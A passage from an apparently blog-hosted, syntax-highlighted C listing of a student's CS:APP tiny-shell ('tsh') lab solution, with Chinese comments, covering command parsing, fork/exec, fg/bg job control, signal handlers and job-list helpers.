immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bg;                               <span class="comment">// 是否是后台程序</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];                    <span class="comment">// cmd copy</span></span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS];                  <span class="comment">// 解析后的命令</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;                       <span class="comment">// 子进程id</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, pre_one; <span class="comment">// 用于同步</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化blocking mask</span></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正式执行命令</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 外部命令</span></span><br><span class="line">        <span class="keyword">if</span> (access(argv[<span class="number">0</span>], F_OK) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 能够运行的外部命令</span></span><br><span class="line">        <span class="comment">// Parent: 在fork前，block SIGCHLD 信号，避免在addjob之前Child结束，触发sigchld_handler,从而deltejob比addjob先执行</span></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;pre_one);</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>)</span><br><span class="line">        &#123;                  <span class="comment">// Child</span></span><br><span class="line">            setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 改变组id，避免信号的自动传送(write up中有更相似的描述)</span></span><br><span class="line">            <span class="comment">// 执行exec之前，解除从Parent中继承过来的block_mask</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">// 执行</span></span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                unix_error(<span class="string">&quot;execve child process error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; <span class="comment">// Parent</span></span><br><span class="line">            <span class="comment">// addjob, block所有信号，避免竞争问题</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">            addjob(jobs, pid,</span><br><span class="line">                   bg ? BG : FG,</span><br><span class="line">                   buf);</span><br><span class="line">            <span class="comment">// 还原信号</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Parent: 前台进程处理</span></span><br><span class="line">        <span class="keyword">if</span> (!bg)</span><br><span class="line">        &#123;</span><br><span class="line">            waitfg(pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 在这里输出，耦合了addjob函数(内部对nextjid++)，如何优化？</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s &amp;\n&quot;</span>, nextjid - <span class="number">1</span>, pid, argv[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] = <span class="string">&#x27; &#x27;</span>;   <span class="comment">/* replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">        buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf++;</span><br><span class="line">        delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim)</span><br><span class="line">    &#123;</span><br><span class="line">        argv[argc++] = buf;</span><br><span class="line">        *delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        buf = delim + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">            buf++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            buf++;</span><br><span class="line">            delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>) <span class="comment">/* ignore blank line */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc - <span class="number">1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *cmd = argv[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 检查合法性</span></span><br><span class="line">    <span class="keyword">if</span> (!cmd || !<span class="built_in">strlen</span>(cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cmmond not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判定4种内置命令</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;quit&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 考虑当前还有后台进程，需要kill</span></span><br><span class="line">        <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">        sigfillset(&amp;mask_all);</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// 先kill 所有子进程</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (jobs[i].pid)</span><br><span class="line">            &#123;</span><br><span class="line">                kill(jobs[i].pid, SIGKILL);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        clearjob(jobs);</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;jobs&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;fg&quot;</span>, cmd) || !<span class="built_in">strcmp</span>(<span class="string">&quot;bg&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* not a builtin command */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span>本函数假设argv[0] 只能 = fg 或者 = bg</span></span><br><span class="line">    <span class="keyword">char</span> *arg = argv[<span class="number">1</span>]; <span class="comment">// 命令参数</span></span><br><span class="line">    <span class="keyword">int</span> jid = <span class="number">-1</span>, pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 命令是否有效？</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数后续是否全是数字</span></span><br><span class="line">    <span class="keyword">if</span> (arg[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        arg++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (*arg != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*arg))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arg++;</span><br><span class="line">    &#125;</span><br><span class="line">    arg = argv[<span class="number">1</span>]; <span class="comment">// 还原</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取job</span></span><br><span class="line">    <span class="keyword">if</span> (arg[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// jid mod</span></span><br><span class="line">        jid = atoi(arg + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// pid mod</span></span><br><span class="line">        pid = atoi(arg);</span><br><span class="line">        jid = pid2jid(pid);</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobjid(jobs, jid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (arg[<span class="number">0</span>] != <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, jid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;fg&quot;</span>, argv[<span class="number">0</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// fg mode</span></span><br><span class="line">        <span class="comment">// 后台进程转前台</span></span><br><span class="line">        <span class="keyword">if</span> (job-&gt;state == FG)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;process is foreground already\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (job-&gt;state == ST)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ST -&gt; RUNNING</span></span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 测试后发现，发送SIGCONT后，也会触发一次SIGCHLD,目前原因未知</span></span><br><span class="line">            kill(job-&gt;pid, SIGCONT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;bg&quot;</span>, argv[<span class="number">0</span>]))</span><br><span class="line">    &#123; <span class="comment">// bg mode</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// 后台stop进程转running进程</span></span><br><span class="line">        <span class="keyword">if</span> (job-&gt;state != ST)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;process isn&#x27;t stoped\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        kill(job-&gt;pid, SIGCONT);</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 这里的printf后面没有加\n，因为cmdline自带\n</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Note: 因为前台进程结束后，会自动调用chld_handler,所以回收工作交给chld_handler处理</span></span><br><span class="line">    <span class="comment">// 这里只用保证tsh被阻塞即可。</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">    <span class="comment">// 初始化blocking mask</span></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123; <span class="comment">// 从全局变量jobs中读取 fg pid，避免jobs的竞争</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="keyword">if</span> (!fgpid(jobs))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 没有前台进程</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************</span></span><br><span class="line"><span class="comment"> * Signal handlers</span></span><br><span class="line"><span class="comment"> *****************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">    <span class="keyword">int</span> pid, wstate;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span> <span class="comment">// 触发本次sigchld_handler的job</span></span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    pid = waitpid(<span class="number">-1</span>, &amp;wstate, WNOHANG | WUNTRACED);</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// waitpid调用返回有两种情况：</span></span><br><span class="line">    <span class="comment">// 1. 子进程terminate</span></span><br><span class="line">    <span class="comment">// 2. 通过信号，被stop了，如用户键入 ctrl+z</span></span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">    <span class="keyword">if</span> (WIFSTOPPED(wstate))</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">// stoped，更新状态即可</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 不应该在handler中出现printf这类async-unsafe, 替换为safe-library即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, SIGTSTP);</span><br><span class="line">        job-&gt;state = ST;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;   <span class="comment">// terminate，需要deletejob</span></span><br><span class="line">        <span class="keyword">if</span> (WIFSIGNALED(wstate))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 不应该在handler中出现printf这类async-unsafe, 替换为safe-library即可</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, SIGINT);</span><br><span class="line">        &#125;</span><br><span class="line">        deletejob(jobs, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有前台进程, forward to it， 后续处理交给chld_handler</span></span><br><span class="line">    <span class="comment">// 注意传递INT信号可能会造成死循环：具体参考https://blog.csdn.net/guozhiyingguo/article/details/53837424</span></span><br><span class="line">    <span class="comment">// 同时注意，这里kill需要发送给整个进程组</span></span><br><span class="line">    kill(-job-&gt;pid, SIGINT);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobpid(jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有前台进程, forward to it， 后续处理交给chld_handler</span></span><br><span class="line">    kill(job-&gt;pid, SIGTSTP);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment"> * End signal handlers</span></span><br><span class="line"><span class="comment"> *********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************</span></span><br><span class="line"><span class="comment"> * Helper routines that manipulate the job list</span></span><br><span class="line"><span class="comment"> **********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    job-&gt;pid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;jid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;state = UNDEF;</span><br><span class="line">    job-&gt;cmdline[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* initjobs - Initialize the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        clearjob(&amp;jobs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maxjid - Returns largest allocated job ID */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, max = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].jid &gt; max)</span><br><span class="line">            max = jobs[i].jid;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* addjob - Add a job to the job list */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].pid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            jobs[i].pid = pid;</span><br><span class="line">            jobs[i].state = state;</span><br><span class="line">            jobs[i].jid = nextjid++;</span><br><span class="line">            <span class="keyword">if</span> (nextjid &gt; MAXJOBS)</span><br><span class="line">                nextjid = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(jobs[i].cmdline, cmdline);</span><br><span class="line">            <span class="keyword">if</span> (verbose)</span><br><span class="line">            &#123;</span><br><span class="line">                